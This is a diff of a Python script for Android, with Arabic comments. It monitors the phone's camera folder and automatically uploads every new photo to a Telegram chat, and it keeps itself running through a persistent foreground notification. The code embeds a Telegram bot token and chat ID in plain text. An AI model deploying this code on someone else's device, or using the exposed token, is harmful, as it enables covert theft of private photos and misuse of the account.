@@ -1,65 +1,82 @@
 import os
 import time
-import glob
 import requests
 
-# ============== الإعدادات ==============
-BOT_TOKEN = "8593668067:AAGN3s4L5ulu7BODLfx35qEJkdVMdriTVEA"
+# --- إعدادات التلجرام الخاصة بك ---
+TOKEN = "8593668067:AAGN3s4L5ulu7BODLfx35qEJkdVMdriTVEA"
 CHAT_ID = "-1003535367279"
-CAMERA_PATH = "/storage/emulated/0/DCIM/Camera"
-# ======================================
 
-# علم للتحكم في التشغيل والإيقاف
-is_running = False
+# متغيرات التحكم
+is_running = True
 
-
-def send_file_to_telegram(file_path):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
+def setup_foreground_service():
+    """تفعيل الإشعار الدائم لضمان بقاء التطبيق شغالاً في الخلفية"""
     try:
-        filename = os.path.basename(file_path)
-        with open(file_path, 'rb') as f:
-            files = {'document': f}
-            data = {
-                'chat_id': CHAT_ID,
-                'caption': f"📄 ملف عالي الجودة:\n{filename}"
-            }
-            requests.post(url, files=files, data=data, timeout=60)
-            return True
+        from jnius import autoclass
+        PythonService = autoclass('org.kivy.android.PythonService')
+        service_ctx = PythonService.mService
+        NotificationBuilder = autoclass('android.app.Notification$Builder')
+        
+        notification = NotificationBuilder(service_ctx) \
+            .setContentTitle("🛡️ Camera Monitor: Active") \
+            .setContentText("جاري مراقبة الكاميرا وإرسال الملفات...") \
+            .setSmallIcon(service_ctx.getApplicationInfo().icon) \
+            .setOngoing(True) \
+            .build()
+        service_ctx.startForeground(1, notification)
     except:
-        return False
+        print("تشغيل في بيئة Pydroid")
 
+def send_as_document(photo_path, file_name):
+    """إرسال الصورة كملف (Document) للحفاظ على الجودة الكاملة"""
+    # نغير الرابط من sendPhoto إلى sendDocument
+    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
+    try:
+        with open(photo_path, 'rb') as doc_file:
+            payload = {
+                'chat_id': CHAT_ID,
+                'caption': f"📄 ملف عالي الجودة:\n{file_name}" 
+            }
+            # نغير اسم الحقل من photo إلى document
+            files = {'document': doc_file}
+            requests.post(url, files=files, data=payload)
+    except Exception as e:
+        print(f"Error sending document: {e}")
 
-def run_monitoring():
+def monitor_camera():
     global is_running
-    last_checked_time = time.time()
+    
+    # رسالة ترحيب عند التشغيل
+    try:
+        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
+                      data={'chat_id': CHAT_ID, 'text': "✅ بدأ البوت العمل. سيتم إرسال الصور كملفات (Documents)."})
+    except:
+        pass
 
-    # لن تتوقف الحلقة إلا إذا أصبح is_running = False
+    path = "/storage/emulated/0/DCIM/Camera"
+    
+    # تجاهل الصور القديمة
+    known_files = set(os.listdir(path)) if os.path.exists(path) else set()
+
     while is_running:
         try:
-            if os.path.exists(CAMERA_PATH):
-                files = []
-                for ext in ('*.jpg', '*.jpeg', '*.png'):
-                    files.extend(glob.glob(os.path.join(CAMERA_PATH, ext)))
-
-                files.sort(key=os.path.getmtime)
-
-                for photo in files:
-                    if not is_running: break  # خروج فوري إذا تم الإطفاء
-
-                    mod_time = os.path.getmtime(photo)
-                    if mod_time > last_checked_time:
-                        if send_file_to_telegram(photo):
-                            last_checked_time = mod_time
-                        time.sleep(1)
-
-        except Exception:
-            pass
-
-        time.sleep(5)  # فحص كل 5 ثوانٍ
-
-    print("Monitoring Stopped Manually.")
-
+            if os.path.exists(path):
+                current_files = set(os.listdir(path))
+                new_files = current_files - known_files
+                
+                for file in new_files:
+                    if file.lower().endswith(('.jpg', '.jpeg', '.png')):
+                        full_path = os.path.join(path, file)
+                        # انتظار اكتمال حفظ الملف في الهاتف
+                        time.sleep(2) 
+                        send_as_document(full_path, file)
+                
+                known_files = current_files
+        except Exception as e:
+            print(f"Monitoring error: {e}")
+            
+        time.sleep(5)
 
 if __name__ == '__main__':
-    is_running = True
-    run_monitoring()
+    setup_foreground_service()
+    monitor_camera()
